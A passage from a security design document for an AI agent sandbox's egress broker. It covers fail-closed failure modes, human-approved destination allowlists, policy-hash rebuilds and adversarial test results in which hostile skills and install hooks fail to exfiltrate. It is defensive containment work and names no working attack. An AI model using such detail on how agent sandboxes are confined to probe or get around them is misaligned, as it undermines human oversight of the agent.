purpose: they are evidence, not policy, and including them would change the
contract on every request.

Proven by editing the policy: adding a single destination flipped the
launcher's decision from `REUSE / IDENTITIES_MATCH` to
`RECREATE / EGRESS_CONTRACT_CHANGED`. A policy change cannot apply silently to
a container already running the old rules.

### 18.6 Failure behaviour, as measured

```text
BROKER_FAILURE     = FAIL_CLOSED   (sandbox stays on the internal network)
POLICY_MISSING     = FAIL_CLOSED
POLICY_INVALID     = FAIL_CLOSED
UNKNOWN_DESTINATION = FAIL_CLOSED
NO_AUTOMATIC_UNRESTRICTED_FALLBACK = YES
```

There is no branch anywhere that reconnects the sandbox to a bridge network
when something is wrong. A broker that cannot validate its policy, cannot bind
its internal address, or holds a mediated credential it cannot use, refuses to
start rather than starting permissively. An empty allowlist is treated as a
configuration error, not as "nothing is allowed yet".

`OFFLINE` is the same contract with the network removed (`--network none`),
not a second architecture. Local repositories, Python, Node, Git, tests and
`HERMES_HOME` keep working; everything external fails.

### 18.7 Adversarial results

`42 / 42 PASS`, covering all 32 required attack classes plus positive controls
and the research boundary. The suite includes deliberate positive controls —
approved SCM read, approved package registries, the provider token swap, the
approved research processor — because a suite that only proves things are
blocked passes happily on a completely broken sandbox.

Malicious in-sandbox code with full execution authority (a hostile skill, a
Git `pre-commit` hook, an npm `preinstall` lifecycle script) runs, and fails
to choose its own recipient. Container recreation does not restore egress.

### 18.8 Adding future providers without weakening the boundary

Model routing is not implemented and is not affected by this slice, but the
policy shape decides whether it *can* be added safely later. It can, because
reachability and credentials are separate concerns here.

A credential alone creates no network path. Adding `OPENROUTER_API_KEY` to the
broker gives the sandbox nothing until a human adds the provider host to the
`MODEL_PROVIDER` class — which changes the policy hash, changes the contract
fingerprint, and forces a deliberate rebuild that a reviewer sees. That is the
gate: human-reviewed policy entry, credential isolation in the broker, a
security test, and provider-endpoint approval.

```text
MODEL_ROUTING_FUTURE_COMPATIBILITY = PASS
OPENROUTER_FUTURE_COMPATIBILITY    = PASS
LOCAL_MODEL_FUTURE_COMPATIBILITY   = PASS
```

Local open-weight models are the easy case: they need no external model egress
at all, so they work in `OFFLINE` as well as in the enforced mode.

### 18.9 What this still does not promise

Unchanged from §1 and worth repeating where an implementer will read it:
this is not DLP. Content the sandbox may read can reach any *approved*
destination — that is what approving a processor means. The reduction is that
the set of possible recipients is short, named, human-approved and reviewable
in a PR diff, instead of being the Internet.
